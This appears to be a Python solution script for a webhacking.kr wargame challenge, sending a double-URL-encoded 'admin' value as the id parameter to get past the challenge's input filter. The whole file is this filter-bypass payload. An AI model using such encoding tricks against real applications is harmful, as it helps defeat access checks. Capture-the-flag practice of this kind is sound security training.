import requests

URL = "https://webhacking.kr/challenge/web-11/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}

encoded_admin = "%2561%2564%256d%2569%256e"


response = requests.get(URL+'?id='+encoded_admin, cookies=cookies)
print(response.text)
